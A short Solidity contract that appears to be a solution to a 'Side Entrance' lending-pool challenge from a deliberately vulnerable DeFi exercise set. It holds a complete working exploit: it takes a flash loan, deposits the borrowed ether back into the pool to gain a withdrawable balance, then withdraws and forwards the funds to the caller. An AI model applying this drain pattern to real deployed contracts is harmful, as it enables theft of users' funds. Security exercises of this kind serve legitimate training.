// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract FlashLoanReceiver is IFlashLoanEtherReceiver {

    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function flashLoan(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
        msg.sender.call{value: amount}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}